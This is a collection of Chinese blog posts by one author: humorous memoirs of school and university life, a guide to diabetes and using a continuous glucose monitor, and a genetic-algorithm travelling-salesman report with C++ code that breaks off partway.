最后的结局，当然是苦涩的，而爬出教室这种事，我这种“优等生”怎么能做得出来，于是只好耍赖皮。看着同桌开心的笑，我悟出了一个道理：原来，吹牛13也是一种前进的动力。
高中的生活丰富多彩，住校之后，犹如脱缰的野马，一发不可收拾，每周可以随意支配的若干RMB简直开启了一个异彩纷呈的世界。第一次接触到了网络，出去上个网纸上列一溜的QQ号和密码帮同学挂，偷偷攒钱买个MP3整天舍不得摘下来，……

脱离监管的日子里，自然是玩大了。当身边的小伙伴兴高采烈地拿到录取通知书时，我背着凉席走上了复读路，当时觉得从家里到车站的那段路很长，低着头走，很费劲。复读的日子是难挨的，在一次班会上，常年带复读班的班主任李老师传达给了我们说了这样一句经典：没有高四的人生是不完整的。于是，除了每周给我们打打鸡血外，每次月考过后，他都会把自己正在读高三的女儿的考试成绩拿到我们面前，进行对比分析。不知道他这是鞭策我们，还是想让我们往届生能知己知彼。后来，听说李老师的女儿考到了大连理工，而我还在纠结：班主任怎么舍得让他闺女的人生有所遗憾？
好了，回到前面说的上清华，还是上北大的问题。当我拿着惨淡的估计值，摊开手中的招生报纸时，发现自己还是可以忠于初心的，没有黄埔，我可以写国防科大啊，反正有些格子空着，也是浪费。所以说，理想和现实之间还是有联系的嘛，牛13先吹出去，能不能实现，那是后话，将来就算给下一辈讲故事至少还有素材。（等等，等等，请问你有女朋友吗？保安，快把这个人拖出去！）
在经历了一番痛苦的煎熬过后，一所日后被我们称作“皇家吃饭学院”的学校，终于伸出双手，接纳了我这个懵懂的少年，我应该感谢这个在我落魄之际收留我的学校，那个不管我怎么调侃她，却不愿别人说她半点不好的地方。

这就是我稀里糊涂的少年时光，当静下心书写这些文字的时候，就像听这首BGM，思绪容易被拉回过去。那段时光很美好，因为天真，因为烂漫，因为无忧无虑，因为豪情万丈。那段时光里也有难挨的日子，高四的同学深知其中的艰辛。记得高四的班会上，有个女同学在黑板上画了一个开口向上的抛物线，她说，我们现在就在这抛物线的最低端，这并不是我们人生的最低谷，但目前我们的确需要爬过这个坎，为理想也好，为尊严也好！
瞻前程似锦，恰同学少年！这就是那段时光。

好了这次就写这些吧，不过，为了和老王这个公众号以往文章的主题靠近一些，所以把我和老王的交流过程贴出来。

。。。前方高能。。。。。。。。。 
。。。看不懂，别看。。。。。。。。 
。。。哈哈。。。。。。。。。。

老王：哎呀，求爷爷告奶奶，终于求稿成功，不容易啊。快，介绍一下自己先。
佚名：大家好，我是隔壁老魏，不对，我是老王隔壁的同事老魏。老王说他有一个个人的公众号，一天没什么东西用来更新，让我给他投稿，不然粉丝就掉光了（只有50个人关注），我看他挺诚恳的（其实是被我们公众号的头像吸引过来了，老王注），于是就瞎写写喽。 
（老王注：头像在文末！）
目的很单纯。 

老王：你写的内容没有什么亮点啊，或者说，一些吸引人的东西。 
佚名：亮点？吸引人？ 
老王：我意思是太平淡了，你高中之前就没有什么情窦初开，或者比较搞笑，奇葩一点的事情啊。这些也可以写进去。
佚名：这不好吧，写了感觉有点丢脸，再说了，我一直都是乖孩子。 
老王：那有啥？谁的青春不傻逼？ 
佚名：好吧。高一的时候，对一个女同学有好感，我同桌帮我把人约到操场了，我当时怂得很，没敢去。就像这句歌词一样。

老王：cao，真tm怂。搁我当年，……还有吗？
佚名：哦，对，记得有次期末考试，考化学，我40分钟左右就交卷了，然后跑到那个女孩所在的考场，在窗外偷偷地看她。 
老王：胆子不小，都学会扒窗户了。最后考试怎么样？ 
佚名：考了70来分吧，后来的化学成绩没有比这更高的了。 
老王：还有没？
佚名：还有就是，把暗恋女生的水杯拧紧，然后在她束手无策时自告奋勇帮她打开。 
老王：可以，小小年纪就懂套路了。 
佚名：我有一次还遇见那个女孩了，不过，她早已嫁为人妇。我们聊起了往事，她告诉，她早知道是我把杯子拧紧，她也默默配合。我当时内心一惊，眼角一酸，赶忙问她：那你为何不道破？她略带悲情失落地说：傻瓜，你长得那么丑，家里还没钱，就让你练练手劲，尔后搬砖之时，莫落后于人。 
老王：。。。
佚名：今天就到这里吧，明天还搬砖呢。对了，老王，我看你各方面都挺有才的，而且经常去隔壁家吹空调，我特别仰慕你。 
老王：说人话！ 
佚名：老王，你要经纪人不？

头像： 


本文原创首发于公众号：老王和他的IT界朋友们 
原文链接：
http://mp.weixin.qq.com/s?__biz=MzIyMDQwNzc5MQ==&mid=2247483801&idx=1&sn=500c1a76bc9c3e781167c7b41988f5df#rd 









这是最好的时光 
这是最坏的时光 
v0.1.1.1


1.2 学校的生活二三事之大学
话说上一回，扯了一下我青涩的少年往事，大家反响不一，有叫好的，有吐槽的，有字字码过的，也有一目十行的。我的心情也是随着读者的反响跌宕起伏，总体趋势是高开低走。原本以为洗个脚是碎碎的事，到头来才知道什么是心比天高，命比纸薄。哎，可惜了我抢了n年积攒的红包，原本以为能小投资大回报，到头来却是千分散尽。亏，血亏！好了言归正传，这回说说大学里的故事。

1.2.1 大一的日子
该从何说起呢，报到那天 or 军训？算了吧，这些记忆里，并没有什么故事可讲，不写也罢。只记得报到那天，同村的学姐带我办完手续之后，告诉我：大一你就好好玩吧，享受大学生活。新的环境，新的上课形式，以及大把可自由支配的时间，确实让人兴奋了一段时间，这段时光可能是大学里最无忧的一段时光了。回想这一年，玩是玩好了，学习自然也拉下了，记得第二学期考试那段时间，刚好是10年南非世界杯。一个长相酷似外星人的大眼睛男孩让人眼前一亮，再加上ccav解说补充说“他祖母去世，小伙子化悲痛为力量”，瞬间成为了“厄祖”的粉丝。尤其是英德大战那场，比赛的画面记忆犹新。那届世界杯，他的表现让我第一次领会到什么叫灵性!当时在足球比赛与高数复习的权衡中，我拜倒在了足球的“石榴裙”下。
 
后来考试的时候，看见自己没有复习的内容出现在试卷上，我是欲哭无泪，可又有什么办法呢，自己酿的苦果再苦也得吞下。最后在多路“神仙”的帮助下，勉强交了卷。考试时，解答题只能写一个“解”字的煎熬，我却再也不想体会。高数最终考了61分，谢天谢地，心里默默感谢老师手下留情。
就这样，大一的日子在好奇、适应、兴奋、任性中度过，最后剩下的只有一双踢坏的足球鞋和勉强没有挂科的成绩单，提醒着我大一的日子已经逝去。后来在大二开学的一次班会上，辅导员鼓励我们总结一下自己的大一生活。于是就有了下面这些文字：


我的大一
回想大一这一年，我是感慨颇多啊！现在回头看看，仔细思量一番，竟然没有一件令自己感到欣慰或骄傲的事，心中自觉脸上有些挂不住，很是汗颜!这时，另一个自己不满了，说道：”没你这样的吧，好歹你没有挂科吧！”我听后，笑了，笑得很是勉强。
如果非要给自己的大一生活打个分的话，我给自己打50分，不及格。因为我看到自己与别人差距已经很大了，这种差距有时候自己都不敢去想。就拿实际情况来说吧，和师院的女生相比自己显得相当惭愧。每天早上看到一大批女生勤奋早读的身影，我都会惭愧的低下头，心里也不由得佩服她们，佩服她们的坚持和韧性。在她们当中，我看到了说英语出口成章的，顺利通过四六级考试的，毕业季奋斗考上研究生的……我觉得我似乎还有希望，她们是榜样。于是我自勉道：向她们学习吧，榜样的力量是无穷的。顺便说一句：师院的女生都很可爱，尤其是但你看到她们勤奋学习的情景时，这种感觉在我心中尤其强烈。
于是乎，暗下决心：英语四六级必须要过，再给自己一个考研的机会吧，无论结果如何，放手一搏，尽管这是一个以胜败论英雄的时代，只求将来不会后悔。

决心是下了，目标是定了，可这个过程注定是艰难的。而完成这个过程所需要的毅力恰恰是我所欠缺的。记得老爸以前就说过我，办事缺乏耐心和恒心，也许就是从那时开始吧，在逆反心理的作用下，我做事也叫起了真，事事苛求完美。有时甚至体现在拖地板上，不希望地上有一个脚印，什么事都想做得合情合理，达到那种圆满的境界。但是现在呢，大一刚开始的时候我太放松了，老想着还有明天呢，一直到最后自己想认认真真从头开始都很难了，于是这让我很是纠结，渐渐地很多时候我对自己说：就这样了，已经不错了，一点一点给自己台阶下，在这种“自欺欺人”的嘴脸下度过了一年，颓废了，堕落了，什么事情都想着应付，能过就过，得过且过。
心里依稀还记得高中时校园里的一句标语“时间抓起来就是黄金，抓不起来就是流水”，俗话说得好：人活在世上要不断的总结反思，这样才能有所收获。希望我的这份总结能给自己有所警醒。
共勉！！！
不知道大家看了之后会有什么感受，有人说矫情，我觉得也是，原来大一我就开始矫情了。这段文字我在班会上读过，现在想想我也是蛮有勇气的。

。。。。割。。。。。

隔壁老王催得紧，本来都想割了，告诉老王下面没有了。可是老王说，现在公众号能“打赏“了，于是七拼八凑，强行来凑个数，能否给老王创收就看缘分吧，反正我是不会打赏的。

。。。。前方高能。。。。
。。。。看不懂，别看。。。。
。。。。哈哈。。。。

老王: 公众号的风格以后不能污了，毕竟都是原创文章，前期污是噱头，后面就要靠真正的实力来hold住人气了。
佚名：老王说的对！我们这实力肯定会让公众号涨粉（负数也是有可能的@_@）的，妥妥的。
老王：十一假期过得怎么样？ 
佚名：嗯，挺忙的。如右图所示。

老王：我去，看来这个月你要吃土了。 
佚名：是啊，你要是看不下去了，打赏的钱分我点？ 
老王：不让我掉粉，再说。 
佚名：……我这几天有点感触，给你讲讲吧。 
老王：好啊。黄色的最好！ 
佚名：就是这几天参加了几场婚礼，受到了好多暴击，不知道什么时候我才能找到另一半。
老王：哎呀，缘分这东西嘛，很难讲的，说不定哪天哪个姑娘眼瞎，就看上你了。 
佚名：真的吗？那我这辈子赚的钱就全给她看病，无论如何也要把她的眼睛给治好!
老王：嗯，好感动。那在找对象这件事上，你有没有反思总结过？ 
佚名：肯定有啊！我这么爱总结反思的人。 
老王：那你说说，你怎么看你自己?
佚名：我吧，优点我自己没看出来，缺点总结了一堆。比如说，宅、懒、丑、贫、矫情、任性等等。连起来说就是:社交不成功，懒还盼巅峰。人丑却颜控，家贫还追星。单身总矫情，没钱还任性。
老王：… ….

本文原创首发于微信公众号：老王和他的IT界朋友们 
原文链接： 
http://mp.weixin.qq.com/s?__biz=MzIyMDQwNzc5MQ==&mid=2247483936&idx=1&sn=d629920cc638643b4c876fe2a0f8d742&chksm=97cd30a0a0bab9b6e33c83febd83b57c28e3400cf62a649956702cd405e5f129869939b52123#rd 









文章大纲1. 全球糖尿病背景2. 中国糖尿病问题现状3. 持续血糖检测及其背景简介3.1 CGM 原理3.2 CGM技术分类与代表企业3.3 CGM 未来趋势4. 使用雅培瞬感传感器进行血糖监控4.1 传感器使用4.2 pc 端数据导出4.2.1 下载及安装4.2.2 导出报告4.3 样例数据及报告4.4 web 端数据导出（目前需要挂代理，有报错）4.5 可视化展现5. 糖尿病预防5.1 糖尿病自查5.2 糖耐异常与饮食健康5.3 健康的生活方式参考文献

作者：王雅宁
注，文章仅代表个人观点，由网络资料搜集及个人经验汇聚而成，也不涉及相关产品的广告推销。医疗相关内容是非常严肃的内容，本文仅在一定程度上按照个人经验给予参考和分享，并没有经过详细论证，如有侵权或不准确的地方请联系删除或改正，如购买相关产品产生医疗事故本人不负责任。
本文主要介绍了试用雅培瞬感CGM 设备进行持续血糖检测的背景及糖尿病相关知识。

1. 全球糖尿病背景
2017年及2045年世界各地区糖尿病患病人数及增长率（20-79岁）1

成年糖尿病患病人数前十国家及相应医疗支出（2017）。值得注意的是，我国成年糖尿病（20-79岁）患病人数达到1.14亿，仍是全球糖尿病患病人数最多的国家。


2. 中国糖尿病问题现状
糖尿病目前已成为我国的常见病，根据国际糖尿病联盟统计数据，2017年中国是世界第一大糖尿病患者国，全球约有4.25亿成人患糖尿病，其中中国糖尿病患者达1.14亿人，约占全球糖尿病人数的1/4居世界首位。
与庞大的糖尿病人群形成鲜明对比的是，我国糖尿病治疗现状堪忧。糖尿病知晓率低，治疗率低，治疗达标率低，并发症却高。不仅血糖达标率低，体重、血压等达标率也不尽如人意：52.3%患者血糖控制不达标，58.3%患者超重，71.6%患者血压控制不达标。
我国糖尿病流行的4个因素
1.老龄化
2.城市化
3.超重肥胖患病率增加
4.中国人的遗传易感性：2型


3. 持续血糖检测及其背景简介
Continuous Glucose Monitoring简称CGM，即连续血糖监测系统，是指通过葡萄糖感应器监测皮下组织间液的葡萄糖浓度而间接反映血糖水平的监测技术。
3.1 CGM 原理
连续血糖监测系统和传统指尖采血测试相比较，指尖采血好比是照相，得到的是某个时间点的血糖值。而CGM好比是录像，获得的是连续血糖值。一个是点，一个是面。


从我个人佩戴的感受来说，基本是完全没有任何感觉的，带着这种CGM 系统的贴片可以游泳，洗澡，完全不影响个人的生活。

CGM设备行业按产品可分为传感器、发射器、接收器和胰岛素泵2。通过一个刺入皮下的传感器，在患者的组织液与体内葡萄糖发生氧化反应时形成电信号，电信号随之被转换为血糖读数，再通过发射器到无线接收器上。在这些数据和直观图的指导下，临床医生能够全面了解患者24小时的血糖波动情况，必要时可配合胰岛素泵给患者注射胰岛素。
以下为传统血糖检测仪和动态血糖检测设备的具体对比3

3.2 CGM技术分类与代表企业
可喜的是我们中国还有不少企业涉及这个新兴领域。

从这32家企业中，我们可以看到连续血糖监测系统（CGM）根据应用场景可分为医院用的和家庭用的，根据使用方法可分为有创型和无创型。若根据采用的技术，CGM又可分为主要的6大类4。

比如，以美敦力和德康为代表的连续血糖监测仪，是通过插入探针传感器来测量血糖值，以 雅培(我们今天的主角) 和Nemaura为代表的产品又是通过一个皮肤贴片来实现血糖监测。另外，还有经皮透析技术、拉曼光谱技术和光电容积脉搏波记录等方法。
3.3 CGM 未来趋势
未来趋势：CGM系统+胰岛素泵=人造胰腺

未来随着CGM技术的成熟，单纯的糖尿病监测已经不能满足人们的需求。
现在已经有公司将连续血糖检测仪智能地与胰岛素泵结合，形成一个闭环人造胰腺系统。
比如：强生、Insulet、Tandem、Ascensia和Pancreum等公司，都已经将美敦力和德康的CGM系统运用到自己的胰岛素泵中，组成一套糖尿病管理系统。
在最简单的CGM系统中，CGM数据近显示在手持设备或其他医疗产品设备上。现在将CGM系统与胰岛素泵紧密连接在一起，胰岛素泵可直接接收到CGM数据，并解读成相应的指令。例如，当患者的血糖值低于某个阈值时，则停止胰岛素输送。理论上说，若这种技术发展成熟后，意味着患者的血糖在任何时候都能保持在正常血糖范围内，这将是治愈糖尿病的最佳方法。

4. 使用雅培瞬感传感器进行血糖监控
雅培设备全家福，一套下来传感器加两个贴片1千多，还是挺贵的。

4.1 传感器使用
1.关注微信公众号

2.回复数字1-9 获取对应操作视频


不得不说，瞬感的小姐姐还挺好看的，哈哈

视频中她亲自示范带上了一个贴片



戴上贴片后，用传感器扫描贴片激活后一小时就可以读数了。
4.2 pc 端数据导出
以使用 windows 为例，在雅培顺感官网下载客户端
http://www.freestyle-libre.cn/Home/Download
4.2.1 下载及安装

官网链接下载好后重启电脑，双击打开软件，通过usb 线链接检测仪器。看到如下所示页面。

填写相关信息，设定目标葡萄糖范围为3.9 到7.8 mmol/L
4.2.2 导出报告
点击创建报告，勾选需要导出的报告维度。（这个和全量导出原始数据无关）

全量导出原始数据
t依次点击，文件，导出数据，输入数据文件名（用户名_当前日期.txt, e.g season_20190528.txt）

导出的样例数据和报告

4.3 样例数据及报告
样例数据

报告

4.4 web 端数据导出（目前需要挂代理，有报错）
登录后点击红框所示位置，这个功能应该是为了方便医生远程医疗。
https://www1.libreview.com/


4.5 可视化展现
小写一点python代码 ，进行医学标准和我自己 检测结果的对比，可以看到，基本上我饭后血糖会有一个飙升，尤其是午饭后。这与陕西人饮食喜欢面食为主有关。
图中，紫色的为医学标准范围，青色的为我自身血糖动态变化的范围。整体随着时间的推移在逐渐向医学上限靠拢。说明我自身需要注意饮食结构 的调整。


5. 糖尿病预防
一般来说，出现下面这8种现象，你或许应该降血糖了


视力变差，看不清视物
体重莫名其妙的下降
一直口干舌燥
上厕所次数变多
一直觉得肚子饿
伤口一直不好
身体异常疲劳
皮肤变得干燥


5.1 糖尿病自查
糖尿病，或者糖尿病前期的诊断标准有很多， 各国的标准也不太一样，基本可以按照下面标准进行对照总结。
对空腹血糖高低的判断标准总结如下：

空腹血糖正常范围：3.9 - 6.1mmol/L
空腹血糖受损（糖尿病前期）：6.1 - 7.0mmol/L
糖尿病：空腹血糖大于 7.0 mmol/L

餐后2小时血糖水平高低的判断标准是：

餐后2小时血糖正常范围：4.4 - 7.8mmol/L
餐后2小时血糖受损（糖尿病前期）：7.8 - 11.1mmol/L
糖尿病：餐后2小时血糖大于 11.1mmol/L

5.2 糖耐异常与饮食健康
糖耐量异常 和糖尿病前期基本可以理解为同一个概念，从我个人的角度来说，影响血糖水平的三大因素：食物，运动，胰岛素。首先应该从饮食入手。那么
吃饭的量应该是多少呢？一图顶千言！

5.3 健康的生活方式
一生不得糖尿病，该怎么办呢？5
1、减轻5％的体重
哪怕你非常肥胖，而且不锻炼，但只要体重减轻5％，患糖尿病的危险就会降低70％。
2、火腿香肠要少吃
每周吃 5 次以上火腿或香肠，糖尿病危险会增加 43％，罪魁祸首是加工肉食中的添加剂。专家建议，应偶尔吃肉，多吃蔬菜。
3、做事前3次深呼吸
稳定情绪，减轻压力
4、睡眠在6~8小时之间
5、不要独居
6、防治记个数字歌
一个信念：与肥胖决裂；
两个要素：不多吃一口，不少走一步；
三个不沾：不吸烟，不饮酒，不熬夜；
四个检查：定期查体重、血压、血糖、血脂；
五六个月：减肥不求速成，每月减一两公斤即可，五六个月就见成效；
七八分饱：饮食上要“总量控制、结构调整、吃序颠倒”，即每餐只吃七八分饱，以素食为主，同时保证营养均衡；进餐时先吃青菜，快饱时再吃些主食、肉类。
7、肌肉是天然降糖药
现在多见的2型糖尿病，就和肌肉消失有关。因为胰岛素要发挥降血糖的作用，需要“助手”的帮忙，即胰岛素受体，而这个助手存在于肌肉细胞上。如果你长期不锻炼，随着肌肉减少，“助手”的数量减少，降糖的作用就渐渐发挥不出来，血糖就上去了。 所以运动锻炼，特别是负重锻炼，是保住肌肉最好的办法。
8、45岁后多关注血糖
血糖指数为 100~125毫克/分升的人，10 年内最易发生糖尿病。专家建议，45 岁后、肥胖者、有糖尿病家族史以及高胆固醇和高血压的人，应多关住。





联系方式




博客
https://blog.csdn.net/wangyaninglm


公众号



QQ交流群
593683975


        THE END
        ALL RIGHTS RESERVED! 


参考文献



速速围观丨2017年IDF全球糖尿病地图（第八版）发布！
http://news.medlive.cn/endocr/info-progress/show-136057_46.html ↩︎

长期保持40%以上的增长率，Dexcom专注的CGM领域刚开始爆发
https://vcbeat.top/MTg3ZmU1M2I1NjYzYjIxYjQyMjgwZWFiNDc5OTU4YTk= ↩︎

连续血糖监测(CGM)——糖尿病领域新战场
http://www.360doc.com/content/19/0405/10/52645714_826555753.shtml ↩︎

CGM连续血糖监测领域盘点：13.7亿美元的市场，主要由这10家企业瓜分
https://vcbeat.top/NmZkZWYxNTI2NmQ4OWU1ODZiYzk0ZWFjNWJlODc4MjE= ↩︎

很多人正处于糖尿病前期，不想得病，牢记这几句话！
http://www.sohu.com/a/244722253_100016900 ↩︎











摘要：
本实验采用遗传算法实现了旅行商问题的模拟求解，并在同等规模问题上用最小生成树算法做了一定的对比工作。遗传算法在计算时间和占用内存上，都远远优于最小生成树算法。
程序采用Microsoft visual studio 2008 结合MFC基本对话框类库开发。32位windows 7系统下调试运行。
 
 
 
 
引言
遗传算法（Genetic Algorithm）是模拟达尔文生物进化论的自然选择和遗传学机理的生物进化过程的计算模型，是一种通过模拟自然进化过程搜索最优解的方法，由密歇根大学的约翰•霍兰德和他的同事于二十世纪六十年代在对细胞自动机（英文：cellular automata）进行研究时率先提出, 并于1975年出版了颇有影响的专著《Adaptation in Natural and Artificial Systems》，GA这个名称才逐渐为人所知，约翰•霍兰德教授所提出的GA通常为简单遗传算法（SGA）。在二十世纪八十年代中期之前，对于遗传算法的研究还仅仅限于理论方面，直到在伊利诺伊大学召开了第一届世界遗传算法大会。随着计算机计算能力的发展和实际应用需求的增多，遗传算法逐渐进入实际应用阶段。1989年，纽约时报作者约翰•马科夫写了一篇文章描述第一个商业用途的遗传算法--进化者（英文：Evolver）。之后，越来越多种类的遗传算法出现并被用于许多领域中，财富杂志500强企业中大多数都用它进行时间表安排、数据分析、未来趋势预测、预算、以及解决很多其他组合优化问题。 
遗传算法是从代表问题可能潜在的解集的一个种群（population）开始的，而一个种群则由经过基因（gene）编码的一定数目的个体(individual)组成。每个个体实际上是染色体(chromosome)带有特征的实体。染色体作为遗传物质的主要载体，即多个基因的集合，其内部表现（即基因型）是某种基因组合，它决定了个体的形状的外部表现，如黑头发的特征是由染色体中控制这一特征的某种基因组合决定的。因此，在一开始需要实现从表现型到基因型的映射即编码工作。由于仿照基因编码的工作很复杂，我们往往进行简化，如二进制编码，初代种群产生之后，按照适者生存和优胜劣汰的原理，逐代（generation）演化产生出越来越好的近似解，在每一代，根据问题域中个体的适应度（fitness）大小选择（selection）个体，并借助于自然遗传学的遗传算子（genetic operators）进行组合交叉（crossover）和变异（mutation），产生出代表新的解集的种群。这个过程将导致种群像自然进化一样的后生代种群比前代更加适应于环境，末代种群中的最优个体经过解码（decoding），可以作为问题近似最优解[1]。
遗传算法是借鉴生物界的进化规律（适者生存，优胜劣汰遗传机制）演化而来的。其主要特点是直接对结构对象进行操作，不存在求导和函数连续性的限定；具有内在的隐并行性和更好的全局寻优能力；采用概率化的寻优方法，能自动获取和指导优化的搜索空间，自适应地调整搜索方向，不需要确定的规则。遗传算法的这些性质，已被人们广泛地应用于组合优化、机器学习、信号处理、自适应控制和人工生命等领域。它是现代有关智能计算中的关键技术。
 
 
 
 
 
 
 
 
 
 
 
综述：
程序总体流程图：

 
这个程序的思想是，随机生成“地点数”编辑框输入的数字的地点，存储在一个vector里。然后用一个“基因类”表示该基因代表第几个点，接着一个“基因组类”有序包含了很多“基因类”，如果一个“基因组类”包含的基因类顺序为：基因组.基因[0].data = 第二个点；基因组.基因[1].data = 第三个点；基因组.基因[3].data = 第一个点；就说明该基因组表示的连线顺序是从第二点连到第三个点再连到第一个点。给每个城市一个固定的基因编号，例如10个城市为 0  1  2  3  4  5  6  7  8  9 ，随机地组成一个染色体（以下所有情况都以10个城市为例说明）。约定这10个城市之间的行走路线为：

(其余基因序列的路线同样道理)
接着有一个“遗传机器类”包含了很多基因组。基因组的数量由“基因组数”编辑框决定。初始化的时候，每个基因组的基因顺序是随机决定的。进行第一代进化的时候，遍历vector<基因组>，计算每个基因组代表的连线方式的连线长度。连线长度越长，说明这个基因组越差劲，因为我们要计算以何种方式连线连线长度最短。
我们用不适应度来记录连线长度。接着就是选择哪个基因组可以生育，遗传给下一代。我采用了一个轮盘赌的策略，尽可能选择不适应度低的基因组进行生育。选择出的基因组进行交换变异后，就把这个基因组复制给下一代。
最后，选择两个最好的基因组，不进行任何变异，直接复制到下一代。这样循环反复，迭代“代数”编辑框输入的代数次数之后，就可以输出结果了。
结果就是最后一代最优秀的那个基因组代表的连线方式。
 
 
 
 
 
主要代码：
void cGAMachine::SetupNextGeneration()//生成下一代基因,进化到下一代

{

vector<cGenome> offspring;//保存下一代基因

m_maxNotFitness = m_genomes[m_population - 1].m_notfitness; 

//所有基因组最大不适应度

while (offspring.size() < (unsigned int)m_population - 2) 

//选择（最大基因组数-2）数量的基因组进行变异和遗传

{

cGenome parent = SelectRouletteWheel();

//进行轮盘赌随机选择一个基因组出来进行生育

cGenome offspring1;

//保存变异后的基因组

MutateInsert(parent.m_genes, offspring1.m_genes);//进行变异

offspring.push_back(offspring1);

//将变异后的基因组压入第二代vector<基因组>里

}

sort(m_genomes.begin(), m_genomes.end());

//对vector<基因组>进行排序，以便下一行代码选出最优秀的个基因组

CopyEliteInto(offspring);

//直接将最优秀的个基因组复制到下一代

m_genomes = offspring;

m_curGener++;//代数计数器+1

 

}

 

cGenome& cGAMachine::SelectRouletteWheel()

{

int nRand = rand() % (int)(m_crossOverRate * m_maxNotFitness) + 0.5 * m_maxNotFitness;

for (std::vector<cGenome>::iterator iter = m_genomes.begin(); iter != m_genomes.end(); ++iter)

{

if (iter->m_notfitness <= nRand)

{

return *iter;

break;

}

}

return m_genomes[0];

}

 

void cGAMachine::MutateInsert(const vector<cGene> &parent, vector<cGene> &offspring)//插入变异

{

if ((rand() / (double)(RAND_MAX)) > m_mutationRate)

{

offspring = parent;

return;

}

int nRandscr = rand() % (parent.size() - 1);

int nRanddes = rand() % (parent.size() - 1);

if (nRanddes == nRandscr)

{

offspring = parent;

return;

}

 

cGene geneInsert = parent[nRandscr];

cGene geneDes = parent[nRanddes];

offspring = parent;

 

offspring.erase(offspring.begin() + nRandscr);

if (nRandscr < nRanddes)

{

offspring.erase(offspring.begin() + nRanddes - 1);

offspring.insert(offspring.begin() + nRanddes - 1, geneInsert);

offspring.insert(offspring.begin() + nRandscr, geneDes);

}

else

{

offspring.erase(offspring.begin() + nRanddes);

offspring.insert(offspring.begin() + nRanddes, geneInsert);

offspring.insert(offspring.begin() + nRandscr, geneDes);

}

}

 

void cGAMachine::CopyEliteInto(std::vector<cGenome> &offspring)

{

for (int i = 0; i < 2 && i < m_population; i++)

{

offspring.push_back(m_genomes[i]);

}

}

 

cGenome& cGAMachine::GetBestResult()

{

sort(m_genomes.begin(), m_genomes.end());

return m_genomes[0];

}

 

 

 

 

 



 
 
 
实验结果：
 
 
 
 
 
使用上图随机生成的节点采用最小生成树
 
 
 
 
采用50个基因组，100次迭代进化，0.5的基因变异率
依次生成50个点，100个点，150个点，200个点，250个点的规模问题运行时间的对比：release版本程序
随着节点数的增加遗传算法的运行时间基本保持在100ms左右
 
占用内存对比：
 
 
发现的问题：
1. 虽然遗传算法在性能上优势很大，但是有时候基本是收敛在局部最优解上了，找全局最优解需要改进的遗传算法。
2. 每次发现的解有很大的不确定性，看人品的算法。
 
未来的工作：
1. 参照《最小生成树算法在旅行商问题中的应用》实现最小生成树的TSP解法法。
2. 改进遗传算法，引入灾变的思想，得到全局最优解。
3. 进一步了解其他智能算法的TSP问题解决方案
 
参考文献：
1.
点击打开链接
2.
 
点击打开链接
 
3. http://blog.csdn.net/corivsky/article/details/3621415
 
工程代码下载地址：
http://download.csdn.net/detail/wangyaninglm/6705587
 
 
其他算法：
 
//=====================================================================

//基本蚁群算法源代码

//使用的城市数据是eil51.tsp

//=====================================================================



// AO.cpp : 定义控制台应用程序的入口点。

#pragma once


#include <iostream>

#include <math.h>  

#include <time.h>


//=====================================================================

//常量定义和参数定义

//=====================================================================

const double ALPHA=1.0; //启发因子，信息素的重要程度

const double BETA=2.0;   //期望因子，城市间距离的重要程度

const double ROU=0.5; //信息素残留参数


const int N_ANT_COUNT=34; //蚂蚁数量

const int N_IT_COUNT=1000; //迭代次数

const int N_CITY_COUNT=51; //城市数量


const double DBQ=100.0; //总的信息素

const double DB_MAX=10e9; //一个标志数，10的9次方


double g_Trial[N_CITY_COUNT][N_CITY_COUNT]; //两两城市间信息素，就是环境信息素

double g_Distance[N_CITY_COUNT][N_CITY_COUNT]; //两两城市间距离


//eil51.tsp城市坐标数据

double  x_Ary[N_CITY_COUNT]=

{

       37,49,52,20,40,21,17,31,52,51,

       42,31,5,12,36,52,27,17,13,57,

       62,42,16,8,7,27,30,43,58,58,

       37,38,46,61,62,63,32,45,59,5,

       10,21,5,30,39,32,25,25,48,56,

       30

};


double y_Ary[N_CITY_COUNT]=

{

       52,49,64,26,30,47,63,62,33,21,

       41,32,25,42,16,41,23,33,13,58,

       42,57,57,52,38,68,48,67,48,27,

       69,46,10,33,63,69,22,35,15,6,

       17,10,64,15,10,39,32,55,28,37,

       40

};


//返回指定范围内的随机整数

int rnd(int nLow,int nUpper)

{

       return nLow+(nUpper-nLow)*rand()/(RAND_MAX+1);

}


//返回指定范围内的随机浮点数

double rnd(double dbLow,double dbUpper)

{

       double dbTemp=rand()/((double)RAND_MAX+1.0);

       return dbLow+dbTemp*(dbUpper-dbLow);

}


//返回浮点数四舍五入取整后的浮点数

double ROUND(double dbA)

{

       return (double)((int)(dbA+0.5));

}


//=====================================================================

//蚂蚁类的定义和实现

//=====================================================================


//定义蚂蚁类

class CAnt

{

public:

       CAnt(void);

       ~CAnt(void);


public:


       int m_nPath[N_CITY_COUNT]; //蚂蚁走的路径

       double m_dbPathLength; //蚂蚁走过的路径长度


       int m_nAllowedCity[N_CITY_COUNT]; //没去过的城市

       int m_nCurCityNo; //当前所在城市编号

       int m_nMovedCityCount; //已经去过的城市数量


public:


       int ChooseNextCity(); //选择下一个城市

       void Init(); //初始化

       void Move(); //蚂蚁在城市间移动

       void Search(); //搜索路径

       void CalPathLength(); //计算蚂蚁走过的路径长度


};


//构造函数

CAnt::CAnt(void)

{

}


//析构函数

CAnt::~CAnt(void)

{

}



//初始化函数，蚂蚁搜索前调用

void CAnt::Init()

{


       for (int i=0;i<N_CITY_COUNT;i++)

       {

              m_nAllowedCity=1; //设置全部城市为没有去过

              m_nPath=0; //蚂蚁走的路径全部设置为0

       }


       //蚂蚁走过的路径长度设置为0

       m_dbPathLength=0.0; 


       //随机选择一个出发城市

       m_nCurCityNo=rnd(0,N_CITY_COUNT);


       //把出发城市保存入路径数组中

       m_nPath[0]=m_nCurCityNo;


       //标识出发城市为已经去过了

       m_nAllowedCity[m_nCurCityNo]=0; 


       //已经去过的城市数量设置为1

       m_nMovedCityCount=1; 


}


//选择下一个城市

//返回值 为城市编号

int CAnt::ChooseNextCity()

{


       int nSelectedCity=-1; //返回结果，先暂时把其设置为-1


       //==============================================================================

       //计算当前城市和没去过的城市之间的信息素总和


       double dbTotal=0.0;       

       double prob[N_CITY_COUNT]; //保存各个城市被选中的概率


       for (int i=0;i<N_CITY_COUNT;i++)

       {

              if (m_nAllowedCity == 1) //城市没去过

              {

//该城市和当前城市间的信息素

                     prob=pow(g_Trial[m_nCurCityNo],ALPHA)*pow(1.0/g_Distance[m_nCurCityNo],BETA); 



                     dbTotal=dbTotal+prob; //累加信息素，得到总和

              }

              else //如果城市去过了，则其被选中的概率值为0

              {

                     prob=0.0;

              }

       }



       //==============================================================================

       //进行轮盘选择

       double dbTemp=0.0;

       if (dbTotal > 0.0) //总的信息素值大于0

